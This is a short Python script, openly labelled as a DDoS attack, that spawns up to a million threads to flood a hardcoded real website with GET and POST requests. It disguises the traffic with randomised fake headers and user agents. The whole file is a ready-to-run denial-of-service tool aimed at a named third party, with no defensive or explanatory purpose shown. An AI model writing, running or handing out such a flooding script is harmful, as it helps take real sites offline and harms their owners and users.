import requests
import threading
import random
import time
from fake_useragent import UserAgent
from fake_headers import Headers

print("1. DDos Attack\n")


# Variables
Choice = input("Enter your choice: ")
ua = UserAgent()

Host = "https://www.wiesgeerts.be/"
headers = Headers().generate()
headers['User-Agent'] = ua.random

def DDosAttack():
    try:
        methods = [
            lambda: requests.get(Host, headers=headers),
            lambda: requests.post(Host, headers=headers)
        ]
        method = random.choice(methods)
        response = method() 
        print(f"Status Code: {response.status_code}\n")
        print(f"Request Headers: {response.request.headers}\n")

    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)

threads = []
match Choice:
    case "1":
        for _ in range(1000000):
            thread = threading.Thread(target=DDosAttack)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
